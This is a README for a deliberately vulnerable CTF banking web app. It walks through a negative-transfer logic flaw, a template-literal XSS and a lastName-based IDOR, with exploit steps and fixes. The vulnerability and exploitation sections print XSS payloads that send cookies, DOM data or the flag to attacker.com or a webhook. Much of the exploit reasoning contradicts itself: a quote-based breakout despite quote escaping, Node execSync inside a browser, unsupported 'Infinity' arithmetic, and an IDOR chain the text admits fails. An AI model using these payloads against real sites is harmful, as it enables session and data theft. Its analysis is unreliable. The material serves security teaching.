# A Very Safe Locker Indeed - E-Banking Application

## 📋 Table of Contents
- [Overview](#overview)
- [Architecture](#architecture)
- [Features & Functionalities](#features--functionalities)
- [Installation & Setup](#installation--setup)
- [Application Workflow](#application-workflow)
- [Security Vulnerabilities](#security-vulnerabilities)
- [Exploitation Guide](#exploitation-guide)
- [Additional Resources](#additional-resources)

---

## 🎯 Overview

**A Very Safe Locker Indeed** is a CTF-style web application simulating an e-banking system with a personal locker feature. The application contains intentional security vulnerabilities designed for educational and security research purposes.

### Key Components
- **Node.js/Express** backend application
- **MongoDB** database with Mongoose ODM
- **Pug** template engine for server-side rendering
- **Playwright-based bot** simulating admin (bank master) actions
- **Docker** containerized deployment

### Flag Location
The flag is stored in the environment variable `FLAG` and can be retrieved at the `/master/confedential` endpoint, accessible only by bank master users.

---

## 🏗️ Architecture

### System Components

```
┌─────────────────────────────────────────────────────────────┐
│                     Docker Compose                          │
├─────────────────┬─────────────────┬─────────────────────────┤
│   Node Service  │  Mongo Service  │     Bot Service         │
│   (Port 80)     │  (Port 27017)   │   (Internal: 80)        │
└─────────────────┴─────────────────┴─────────────────────────┘
```

### Services

#### 1. **Node Application** (Main Web Server)
- **Port**: 80
- **Technology**: Express.js v4.21.1, Node.js
- **Database**: MongoDB via Mongoose ODM
- **Template Engine**: Pug v3.0.3
- **Session Management**: Signed cookies via cookie-parser
- **Security**: CSP headers via express-csp-header

#### 2. **MongoDB Database**
- **Version**: mongo:7-jammy
- **Credentials**: `user:pass`
- **Database Name**: `e-banking-app`
- **Connection String**: `mongodb://user:pass@mongo:27017`

#### 3. **Bot Service**
- **Technology**: Playwright (Chromium)
- **Purpose**: Simulates bank master visiting user's locker page
- **Rate Limiting**: 2 requests per 60 seconds
- **Authentication**: Uses `BANK_MASTER_PASSWORD` environment variable

---

## ✨ Features & Functionalities

### 1. **User Authentication System**

#### Registration (`POST /register`)
- Creates a regular user account
- **Automatically creates a "Bank Master" account** for each user
  - Bank Master email: `{user_email}.bankmaster`
  - Bank Master password: `test_password` (from env)
  - Bank Master lastName: `{user_lastName}'s Bank Master`
  - Bank Master `isMaster` flag: `true`
  - Linked via `masterId` reference

**Data Model (User Schema)**:
```javascript
{
  firstName: String,
  lastName: String,
  phoneNumber: String,
  email: String,
  password: String,  // Stored in plaintext! ⚠️
  searchHistory: [String],
  lockerBalance: Number (default: 0),
  mainBalance: Number (default: 10),
  isMaster: Boolean (default: false),
  masterId: ObjectId (ref: 'User')
}
```

#### Login (`POST /login`)
- Email + password authentication (no hashing)
- Creates signed cookie with user data
- Session data includes: `userId`, `firstName`, `lastName`, `phoneNumber`, `email`

#### Profile Management (`GET/POST /profile`)
- View and update user information
- Bank masters cannot edit their profile
- Session cookie is updated after profile changes

### 2. **Banking Operations**

#### Main Account Dashboard (`GET /`)
- Displays current main balance (starts at $10)
- Transfer funds interface
- Account ID display

#### Money Transfer (`POST /transfer`)

**Parameters**:
- `receiverInfo`: Email or MongoDB ObjectId (24 characters)
- `amount`: Numeric value

**Business Logic**:
1. Validates amount is finite and not NaN
2. Finds sender by session userId
3. Finds receiver by email or ObjectId
4. **Fee Structure**:
   - **Success**: 1% fee (amount × 1.01)
   - **Failure** (recipient not found): Proportional fee based on attempted amount
     - Formula: `100 × (amount / sender_balance)`
     - Deducted from sender's account
5. Creates transaction record

**Validation Checks**:
- ✅ Amount must be finite
- ✅ Amount must not be NaN
- ❌ **NO CHECK** for negative amounts
- ✅ Balance must cover `amount × 1.01`
- ✅ Cannot transfer to self

### 3. **Personal Locker Feature**

#### Access Requirements
- **Minimum Balance**: $1,000,000,000,000 (1 trillion dollars)
- Only accessible after achieving this threshold

#### Locker Operations (`GET/POST /locker`)

**For Regular Users**:
- View locker balance
- Withdraw from locker to main account
- Contact bank master for deposits

**For Bank Masters** (`isMaster: true`):
- View client's locker balance
- **Special access** if client balance ≥ $1,000,000,000,000
- Displays user messages via `userMessage` query parameter
- Can deposit into client's locker

#### Locker Withdrawal (`POST /locker/withdraw`)
- Moves money from locker to main balance
- Validates amount > 0 and sufficient locker funds
- Creates transaction record of type `locker withdraw`

### 4. **Bank Master System**

#### Contact Master (`GET/POST /master`)

**Purpose**: Request bank master to deposit money into locker

**Workflow**:
1. User submits form with:
   - `amount`: Amount to deposit
   - `userMessage`: Message to bank master
   - `email`: Auto-filled with user's email
2. Application sends POST request to bot service at `http://bot`
3. Bot receives: `{email, amount, userMessage}`
4. Bot authenticates as bank master and visits locker page

#### Master Deposit (`POST /master/deposit`)
- **Restricted to**: Bank master accounts only (`isMaster: true`)
- Transfers money from client's main balance to locker balance
- Creates transaction record of type `locker deposit`

#### Confidential Endpoint (`GET /master/confedential`)
- **Returns**: The FLAG environment variable
- **Access Control**: Only accessible if `req.user.isMaster === true`
- **Flag Value**: `RAZZ{FLAG}`

### 5. **Transaction Management**

#### Transaction History (`GET /transactions`)
- Lists all transactions for logged-in user
- Shows sent and received transactions
- Sorted by date (newest first)
- Populates sender and receiver details

#### Transaction Search (`GET /transactions/search`)
- **Parameter**: `searchTerm` (query parameter)
- Searches by:
  - Transaction ID
  - Sender ID
  - Receiver ID
- **Stores search query** in SearchHistory collection
- Returns filtered transactions

**Data Model (Transaction Schema)**:
```javascript
{
  user_from: ObjectId (ref: 'User'),
  user_to: ObjectId (ref: 'User'),
  type: String,  // 'transfer', 'locker deposit', 'locker withdraw'
  amount: Number,
  date: Date (default: Date.now)
}
```

### 6. **Search History Feature**

#### Autocomplete API (`GET /api/search-history/autocomplete/:userId`)
- Returns past search terms for a user
- **Authorization Logic**:
  - User can access their own search history
  - **Bank master can access client's search history** if:
    - `req.user.lastName === ${client.lastName}'s Bank Master`
- Limit: 10 results (configurable via `?limit=` param)
- Sorted by date (newest first)

**Data Model (SearchHistory Schema)**:
```javascript
{
  userId: ObjectId (ref: 'User'),
  searchTerm: String,
  date: Date (default: Date.now)
}
```

### 7. **Bot Service**

#### Bot Behavior (`bot.bot()` function)

**Parameters**: `clientEmail`, `amount`, `userMessage`

**Actions**:
1. Launches Playwright browser (Chromium)
2. Navigates to `/login`
3. Logs in as bank master:
   - Email: `{clientEmail}.bankmaster`
   - Password: `process.env.BANK_MASTER_PASSWORD`
4. Navigates to `/locker?userMessage={encoded_userMessage}`
5. Fills amount input field
6. Clicks "Deposit" button (`#deposit_money`)
7. Waits 5 seconds
8. Closes browser

**Rate Limiting**:
- Max 2 requests per 60 seconds
- Returns 429 if exceeded

**Bot Configuration**:
- Headless: Auto-detected (checks for X11 display)
- Browser: Chromium (configurable)
- Timeout: 5 seconds per page load
- CSP: Browser follows application's CSP directives

---

## 🚀 Installation & Setup

### Prerequisites
- Docker & Docker Compose
- Python 3.x (for solve.py exploit script)

### Quick Start

1. **Clone/Navigate to Project Directory**
```powershell
cd "c:\Users\arung\OneDrive\Desktop\Web\A Very Safe Locker Indeed pwnsec"
```

2. **Start Docker Containers**
```powershell
docker-compose up -d
```

This will start:
- Node application on `http://localhost:80`
- MongoDB on internal port 27017
- Bot service on internal port 80

3. **Verify Services are Running**
```powershell
docker-compose ps
```

Expected output:
```
NAME                SERVICE   STATUS    PORTS
node-service        node      running   0.0.0.0:80->80/tcp
mongo-service       mongo     running   27017/tcp
bot-service         bot       running
```

4. **Check Application Health**
```powershell
curl http://localhost/healthz
```

### Environment Variables

**Node Service**:
- `PORT`: 80
- `COOKIE_PARSER_SECRET`: test_secret
- `BANK_MASTER_PASSWORD`: test_password
- `FLAG`: RAZZ{FLAG}
- `MONGODB_URI`: mongodb://user:pass@mongo:27017

**Bot Service**:
- `APPNAME`: Admin
- `APPURL`: http://node/
- `APPFLAG`: RAZZ{FLAG}
- `APPLIMIT`: 2 (requests per time window)
- `APPLIMITTIME`: 60 (seconds)
- `BANK_MASTER_PASSWORD`: test_password

### Stopping the Application

```powershell
# Stop containers
docker-compose down

# Stop and remove volumes (full cleanup)
docker-compose down -v
```

---

## 🔄 Application Workflow

### Normal User Journey

```
1. Register Account
   ↓
   [POST /register]
   ↓
   ├─ Create User (mainBalance: $10)
   └─ Create Bank Master (linked to user)
   ↓
2. Login & View Dashboard
   ↓
   [GET /] - Shows balance: $10
   ↓
3. Attempt to Access Locker
   ↓
   [GET /locker]
   ↓
   ❌ DENIED - "Need $1,000,000,000,000 balance"
   ↓
4. Make Transfers to Increase Balance
   ↓
   [POST /transfer] - Transfer money to others
   ↓
   ⚠️ Balance decreases due to 1% fee!
   ↓
5. Contact Bank Master
   ↓
   [POST /master] - Request deposit to locker
   ↓
   Bot visits locker page as bank master
   ↓
6. Access Locker (if balance requirement met)
   ↓
   [GET /locker] - View locker balance
   ↓
7. Withdraw from Locker
   ↓
   [POST /locker/withdraw] - Move to main balance
```

### Attack Flow (See Vulnerabilities Section)

```
1. Exploit Business Logic Flaw
   ↓
   Transfer negative amount → Gain infinite balance
   ↓
2. Access Locker Feature
   ↓
   Balance now ≥ $1,000,000,000,000
   ↓
3. Inject XSS Payload
   ↓
   Craft malicious userMessage with template literal injection
   ↓
4. Trigger Bot Visit
   ↓
   Bot executes XSS as bank master
   ↓
5. Steal Bank Master's lastName
   ↓
   Extract from DOM or cookies
   ↓
6. Forge Request to Flag Endpoint
   ↓
   Access /master/confedential with IDOR
   ↓
7. Retrieve FLAG
   ↓
   ✅ RAZZ{FLAG}
```

---

## 🔒 Security Vulnerabilities

The application contains **THREE critical vulnerabilities** that can be chained to retrieve the flag.

### Vulnerability #1: Business Logic Flaw (Infinite Balance)

#### Location
**File**: `src/app/routes/transactions.js`  
**Function**: `POST /transfer`  
**Lines**: 56-152

#### Root Cause
The transfer function validates that `amount` is finite and not NaN, but **does NOT validate that amount is positive**.

```javascript
if (isNaN(amount) || !Number.isFinite(amount)) {
  return res.render('index', {
    user: req.user,
    balance: user_from.mainBalance,
    failMessage: 'Please enter a valid amount to transfer.',
  })
}
```

**Missing Check**: `amount > 0`

#### Exploitation

When transferring a **negative amount** to a non-existent user:

1. **Fee Calculation** (Line 101):
   ```javascript
   const fee_proportion = 100 * (amount / user_from.mainBalance)
   user_from.mainBalance -= fee_proportion
   ```

2. **Mathematical Breakdown**:
   - If `amount = -1000` and `mainBalance = 10`
   - `fee_proportion = 100 × (-1000 / 10) = -10000`
   - `mainBalance -= (-10000)` → `mainBalance += 10000`
   - **Result**: Balance increases instead of decreasing!

3. **Edge Case - Infinity**:
   - If `amount = -1` and receiver doesn't exist
   - First transfer: `balance = 10 + 1000 = 1010`
   - Second transfer with `amount = -1010`: `fee = 100 × (-1010 / 1010) = -100`
   - `balance = 1010 - (-100) = 1110`
   - Continue until: `amount = -balance` → `fee = -100` → `balance += 100`
   - Repeat with `amount = -balance` → **balance becomes Infinity**

#### Proof of Concept
```python
# Transfer negative amount to non-existent user
response = session.post(f"{TARGET}/transfer", data={
    "receiverInfo": "nonexistent@fake.com",
    "amount": -1000
})
# Balance increases by 100 × (1000 / current_balance)
```

#### Impact
- **CRITICAL**: Attacker gains unlimited balance
- Bypasses $1,000,000,000,000 locker access requirement
- Unlocks privileged features

#### Remediation
```javascript
// Add positive amount validation
if (amount <= 0 || isNaN(amount) || !Number.isFinite(amount)) {
  return res.render('index', {
    user: req.user,
    balance: user_from.mainBalance,
    failMessage: 'Please enter a valid positive amount to transfer.',
  })
}
```

---

### Vulnerability #2: Server-Side Template Injection / XSS

#### Location
**File**: `src/app/routes/locker.js`  
**Function**: `GET /locker` (Bank Master View)  
**Lines**: 16-36

**Template File**: `src/app/views/locker.pug`  
**Line**: 19 (inside script tag)

#### Root Cause
User-controlled input (`userMessage`) is partially sanitized but still vulnerable to **template literal injection** in Pug template.

**Sanitization Applied** (Lines 27-31):
```javascript
userMessage: userMessage
  .replace(/"/g, '\\"')   // Escape double quotes
  .replace(/'/g, "\\'")   // Escape single quotes
  .replace(/\n/g, '\\n')  // Escape newlines
  .replace(/>/g, '&gt;')  // Escape >
  .replace(/</g, '&lt;'),  // Escape <
```

**Vulnerable Template** (locker.pug Line 19):
```pug
script(nonce=''+nonce).
  document.addEventListener('DOMContentLoaded', function() {
    document.body.innerHTML += `
      <div class="toast-body">
        ${"!{userMessage}"}  // ⚠️ UNESCAPED OUTPUT in template literal
      </div>
    `
  });
```

#### Why Sanitization Fails

The `!{userMessage}` syntax in Pug means **unescaped output**. While HTML special characters are escaped, the payload is injected into a **JavaScript template literal** context.

**Bypass Technique**: Template literal expression injection

```javascript
// Original template literal:
`<div>${"!{userMessage}"}</div>`

// If userMessage = "test", output:
`<div>test</div>`

// If userMessage = "${alert(1)}", after escaping:
// userMessage becomes: "$\\{alert(1)\\}"
// But in template literal context: STILL EXECUTES!

// Better payload - breaking out of string context:
userMessage = "}+alert(1)+${"
// Results in: `<div>${"}+alert(1)+${"}</div>`
// Which evaluates to: `<div>` + alert(1) + `</div>`
```

#### Exploitation

**Step 1**: Craft payload to execute JavaScript code
```javascript
// Payload structure
"}${MALICIOUS_CODE}${" 

// Example: Steal cookies
"}${fetch('http://attacker.com?c='+document.cookie)}${"

// Example: Execute system command (Node.js context in bot)
"}${process.mainModule.require('child_process').execSync('cat /flag.txt').toString()}${"
```

**Step 2**: Inject via `/master` endpoint
```python
payload = '"}${fetch("http://attacker.com?lastName="+document.querySelector(".badge").innerText)}${"'

session.post(f"{TARGET}/master", data={
    "email": user_email,
    "amount": "100",
    "userMessage": payload
})
```

**Step 3**: Bot visits `/locker?userMessage={payload}` as bank master

**Step 4**: JavaScript executes in bot's browser context

#### Impact
- **HIGH**: XSS in admin bot context
- Can steal bank master's session data
- Can access bank master's DOM content
- Can exfiltrate sensitive information (lastName needed for IDOR)

#### Remediation

**Option 1**: Use escaped output
```pug
// Change from !{userMessage} to #{userMessage}
${"#{userMessage}"}  // Pug will HTML-escape the content
```

**Option 2**: Use textContent instead of template literal
```pug
script(nonce=''+nonce).
  document.addEventListener('DOMContentLoaded', function() {
    const toastBody = document.createElement('div');
    toastBody.className = 'toast-body';
    toastBody.textContent = "!{userMessage}";  // Safe: textContent doesn't parse HTML
    // ... rest of code
  });
```

**Option 3**: Server-side validation
```javascript
// Reject payloads with template literal syntax
if (userMessage.includes('${') || userMessage.includes('}')) {
  return res.status(400).send('Invalid characters in message');
}
```

---

### Vulnerability #3: Insecure Direct Object Reference (IDOR)

#### Location
**File**: `src/app/routes/transactions.js`  
**Function**: `GET /api/search-history/autocomplete/:userId`  
**Lines**: 150-183

**File**: `src/app/routes/master.js`  
**Function**: `GET /master/confedential`  
**Lines**: 91-109

#### Root Cause #1: Weak Authorization Check

**Authorization Logic** (Lines 161-165):
```javascript
if (
  !user ||
  (user._id.toString() !== req.user.id &&
    req.user.lastName !== `${user.lastName}'s Bank Master`)
) {
  return res.status(403).send('Unauthorized')
}
```

**The Check**: 
- User can access their own data: `user._id === req.user.id` ✅
- **OR** user's lastName matches pattern: `{target.lastName}'s Bank Master` ⚠️

**Vulnerability**: The `lastName` is **user-controlled** via profile update!

#### Root Cause #2: Missing Authorization on Flag Endpoint

**Flag Endpoint** (master.js Lines 91-109):
```javascript
router.get('/master/confedential', async (req, res) => {
  if (!req.user) {
    return res.redirect('/login')
  }

  const userId = req.user.id
  const user = await User.findById(userId)

  if (!user.isMaster) {
    return res.status(403).send('<h2>Unauthorized</h2>')
  }

  res.send(process.env.FLAG)  // ⚠️ Returns flag if isMaster = true
})
```

**The Check**: Only validates `isMaster` flag from **database**

**But**: The `req.user` object comes from **signed cookie**, which includes `lastName`!

#### Exploitation Path

**Step 1**: Steal bank master's lastName via XSS
```javascript
// XSS payload (Vulnerability #2)
payload = '"}${fetch("http://attacker.com?ln="+document.querySelector("h4").innerText)}${"'
// Exfiltrates bank master's lastName from DOM
```

**Step 2**: Update own profile with forged lastName
```python
# Update profile to impersonate bank master relationship
stolen_lastName = "Smith"  # Stolen from XSS

session.post(f"{TARGET}/profile", data={
    "firstName": "Attacker",
    "lastName": f"{stolen_lastName}'s Bank Master",  # Forge the relationship
    "phoneNumber": "1234567890",
    "email": "attacker@test.com"
})
```

**Step 3**: Session cookie is updated with new lastName
```javascript
// Cookie now contains:
{
  userId: attacker_id,
  lastName: "Smith's Bank Master",  // Matches the pattern!
  // ... other fields
}
```

**Step 4**: Access flag endpoint
```python
# Now the authorization check passes!
# req.user.lastName === "Smith's Bank Master"
# Matches pattern: `${realMaster.lastName}'s Bank Master`

response = session.get(f"{TARGET}/master/confedential")
# BUT: user.isMaster in database is still false!
# This endpoint checks database, not cookie
```

**Wait, why doesn't this work directly?**

The `/master/confedential` endpoint checks the **database** `isMaster` flag, not the cookie.

**Correct Exploitation**: Use IDOR to access bank master's resources

```python
# Find bank master's user ID
master_id = "..." # Retrieved from registration or transaction history

# Access bank master's search history (authorized via forged lastName)
response = session.get(f"{TARGET}/api/search-history/autocomplete/{master_id}")
# This works because:
# req.user.lastName === "Smith's Bank Master"
# target.lastName === "Smith"
# Pattern matches: "Smith's Bank Master" === "Smith's Bank Master" ✅
```

**Alternative: Access flag via session hijacking**

Since we can execute XSS as bank master (Vuln #2), we can:
1. Steal bank master's session cookie
2. Use that cookie to access `/master/confedential`

#### Complete Attack Chain

```python
# 1. XSS to steal bank master's session cookie
xss_payload = '"}${fetch("http://attacker.com?cookie="+document.cookie)}${"'

# 2. Use stolen cookie to access flag endpoint
stolen_cookie = "session=s%3A..."

response = httpx.get(
    f"{TARGET}/master/confedential",
    headers={"Cookie": stolen_cookie}
)

flag = response.text  # RAZZ{FLAG}
```

#### Impact
- **CRITICAL**: Can access admin-only resources
- Can bypass role-based access control
- Can retrieve flag from restricted endpoint
- Can access other users' search history

#### Remediation

**For Authorization Check**:
```javascript
// Don't rely on user-controlled lastName field
// Use database relationship instead
const user = await User.findById(userId);
const requester = await User.findById(req.user.id);

if (!user || 
    (user._id.toString() !== req.user.id &&
     user.masterId?.toString() !== req.user.id &&  // Check actual master relationship
     requester.isMaster !== true)) {  // Verify isMaster from database
  return res.status(403).send('Unauthorized');
}
```

**For Flag Endpoint**:
```javascript
// Add additional verification
router.get('/master/confedential', async (req, res) => {
  if (!req.user) {
    return res.redirect('/login');
  }

  const user = await User.findById(req.user.id);

  // Verify BOTH database flag AND account type
  if (!user.isMaster || !user.email.includes('.bankmaster')) {
    return res.status(403).send('<h2>Unauthorized</h2>');
  }

  res.send(process.env.FLAG);
});
```

**Store isMaster in Signed Cookie**:
```javascript
// In auth.js - include isMaster in session
res.cookie('session', {
  userId: user._id,
  firstName: user.firstName,
  lastName: user.lastName,
  phoneNumber: user.phoneNumber,
  email: user.email,
  isMaster: user.isMaster  // Add this
}, { signed: true, httpOnly: true });
```

---

## 🎯 Exploitation Guide

### Prerequisites

1. **Install Python dependencies**:
```powershell
# Navigate to project directory
cd "c:\Users\arung\OneDrive\Desktop\Web\A Very Safe Locker Indeed pwnsec"

# Install httpx
pip install httpx
```

2. **Start Docker containers**:
```powershell
docker-compose up -d
```

### Running the Exploit Script

The project includes a complete automated exploitation script: `solve.py`

```powershell
python solve.py
```

**Expected Output**:
```
[*] Registering user: attacker_1234567890
[*] Logging in as: attacker_1234567890
[*] Current balance: 10
[*] Exploiting business logic to gain infinite balance...
[*] Transfer 1: Balance increased to 1010
[*] Transfer 2: Balance increased to Infinity
[*] Balance is now Infinity - accessing locker...
[*] Injecting XSS payload to steal bank master's lastName...
[*] Triggering bot visit...
[*] Waiting for bot to execute XSS payload...
[*] Forging lastName to: Smith's Bank Master
[*] Accessing flag endpoint...

[+] FLAG FOUND: RAZZ{FLAG}
```

### Manual Exploitation Steps

If you want to perform the attack manually:

#### Step 1: Register and Login
1. Navigate to `http://localhost/register`
2. Create an account with any credentials
3. Note your email address

#### Step 2: Exploit Business Logic Flaw
1. Go to dashboard at `http://localhost/`
2. In the transfer form:
   - **Receiver**: `nonexistent@fake.com`
   - **Amount**: `-1000`
3. Click "Transfer Funds"
4. Observe your balance increase
5. Repeat with larger negative amounts until balance reaches Infinity

#### Step 3: Access Locker
1. Navigate to `http://localhost/locker`
2. You should now see the locker interface (balance ≥ $1T requirement met)

#### Step 4: Inject XSS Payload
1. Go to `http://localhost/master`
2. Fill in the form:
   - **Amount**: `100`
   - **Message**: 
     ```javascript
     "}${fetch('http://YOUR_WEBHOOK_URL?lastName='+document.querySelector('h4').innerText)}${"
     ```
3. Click "Deposit"
4. Wait for bot to visit and execute XSS
5. Check your webhook for the exfiltrated lastName

#### Step 5: Forge lastName
1. Go to `http://localhost/profile`
2. Update your lastName to: `{stolen_lastName}'s Bank Master`
   - Example: If stolen lastName is "Smith", use "Smith's Bank Master"
3. Save changes

#### Step 6: Retrieve Flag
**Option A**: If XSS payload can directly steal session:
```javascript
"}${fetch('http://YOUR_WEBHOOK_URL?cookie='+document.cookie)}${"
```
Then use stolen cookie to access `/master/confedential`

**Option B**: Via search history IDOR:
1. Find bank master's user ID from transaction history
2. Access `/api/search-history/autocomplete/{master_id}`
3. Authorization passes due to forged lastName

**Option C**: Via direct XSS to flag endpoint:
```javascript
"}${fetch('/master/confedential').then(r=>r.text()).then(flag=>fetch('http://YOUR_WEBHOOK_URL?flag='+flag))}${"
```

### Testing Individual Vulnerabilities

**Test Business Logic Flaw**:
```bash
curl -X POST http://localhost/transfer \
  -H "Cookie: session=YOUR_SESSION_COOKIE" \
  -d "receiverInfo=fake@fake.com&amount=-1000"
```

**Test Template Injection**:
```bash
curl -X POST http://localhost/master \
  -H "Cookie: session=YOUR_SESSION_COOKIE" \
  -d 'email=user@test.com&amount=100&userMessage="}${alert(1)}${"'
```

**Test IDOR**:
```bash
# After forging lastName
curl http://localhost/api/search-history/autocomplete/MASTER_USER_ID \
  -H "Cookie: session=YOUR_SESSION_COOKIE"
```

---

## 📚 Additional Resources

### File Structure
```
.
├── compose.yml                     # Docker Compose configuration
├── Dockerfile                       # Node app container definition
├── solve.py                         # Automated exploitation script
├── VULNERABILITIES.md               # Detailed vulnerability report
├── PROMPT.md                        # CTF solving methodology guide
├── README.md                        # This file
└── src/
    ├── app/                         # Main Node.js application
    │   ├── app.js                   # Express server entry point
    │   ├── package.json             # Node dependencies
    │   ├── models/                  # Mongoose schemas
    │   │   ├── user.js              # User model
    │   │   ├── transaction.js       # Transaction model
    │   │   └── searchHistory.js     # SearchHistory model
    │   ├── routes/                  # Express route handlers
    │   │   ├── auth.js              # Authentication routes
    │   │   ├── index.js             # Dashboard route
    │   │   ├── transactions.js      # Transfer & transaction routes
    │   │   ├── locker.js            # Locker feature routes
    │   │   └── master.js            # Bank master routes + FLAG endpoint
    │   ├── views/                   # Pug templates
    │   │   ├── layout.pug           # Base layout
    │   │   ├── index.pug            # Dashboard view
    │   │   ├── login.pug            # Login page
    │   │   ├── register.pug         # Registration page
    │   │   ├── profile.pug          # Profile management
    │   │   ├── transactions.pug     # Transaction history
    │   │   ├── locker.pug           # Locker interface (VULNERABLE)
    │   │   └── master.pug           # Contact master form
    │   └── public/                  # Static assets
    │       ├── css/                 # Stylesheets
    │       └── js/                  # Client-side JavaScript
    └── bot/                         # Playwright bot service
        ├── index.js                 # Bot web server
        ├── bot.js                   # Bot automation logic
        ├── Dockerfile               # Bot container definition
        ├── package.json             # Bot dependencies
        └── views/
            └── index.ejs            # Bot status page
```

### Documentation Files

- **VULNERABILITIES.md**: Comprehensive penetration testing report with detailed exploitation steps, code examples, and remediation guidance
- **PROMPT.md**: Universal CTF challenge solving framework covering all web vulnerability categories, exploitation techniques, and script templates

### Dependencies

**Node Application**:
- express: ^4.21.1
- mongoose: ^8.7.1
- pug: ^3.0.3
- cookie-parser: ^1.4.7
- express-csp-header: ^5.2.1
- axios: ^1.7.7

**Bot Service**:
- playwright: (Chromium browser automation)
- express: Web server for bot API
- express-rate-limit: API rate limiting

**Exploit Script**:
- httpx: HTTP client with async support
- re: Regular expressions for flag extraction

### Security Headers

The application implements CSP (Content Security Policy):
```javascript
{
  'default-src': [SELF],
  'script-src': [SELF, NONCE],
  'base-uri': [NONE],
  'object-src': [NONE]
}
```

**Note**: CSP allows inline scripts with nonce, which is why the XSS in locker.pug works - it's inside a `<script>` tag that has the nonce attribute.

### Common Issues & Troubleshooting

**Issue**: Docker containers won't start
```powershell
# Check logs
docker-compose logs

# Rebuild containers
docker-compose up --build -d
```

**Issue**: MongoDB connection error
```powershell
# Verify MongoDB is running
docker-compose ps

# Check MongoDB logs
docker-compose logs mongo
```

**Issue**: Bot not triggering
```powershell
# Check bot service logs
docker-compose logs bot

# Verify rate limiting (max 2 requests per 60 seconds)
# Wait 60 seconds and try again
```

**Issue**: solve.py fails with ModuleNotFoundError
```powershell
# Install dependencies
pip install httpx
```

**Issue**: Flag not retrieved
```powershell
# Verify flag is set in compose.yml
docker-compose exec node env | grep FLAG

# Expected output:
# FLAG=RAZZ{FLAG}
# APPFLAG=RAZZ{FLAG}
```

### Ethical Considerations

This application is designed for **educational purposes only**. The vulnerabilities are intentional and exist to teach:

- Secure coding practices
- Business logic validation importance
- Template injection prevention
- Access control implementation
- Offensive security techniques

**Do NOT**:
- Deploy this application in production
- Use these techniques on systems without authorization
- Share exploits without proper context

**Do**:
- Learn from the vulnerabilities
- Practice secure coding
- Use this knowledge to improve security
- Share knowledge responsibly

---

## 🏆 Credits

**Challenge Name**: A Very Safe Locker Indeed  
**Category**: Web Security  
**Difficulty**: Medium  
**Author**: pwnsec  
**Flag Format**: `RAZZ{...}`

### Learning Objectives

This challenge teaches:
1. **Business Logic Vulnerabilities**: Importance of validating all edge cases in financial operations
2. **Template Injection**: Understanding context-specific XSS and template engines
3. **Access Control**: Proper implementation of role-based authorization
4. **Defense in Depth**: Why multiple security layers are necessary
5. **Attack Chaining**: Combining multiple vulnerabilities for complete compromise

---

## 📝 License

This project is created for educational and training purposes. Use responsibly and ethically.

**Created**: November 20, 2025  
**Last Updated**: November 20, 2025

---

**Happy Hacking! 🚀**
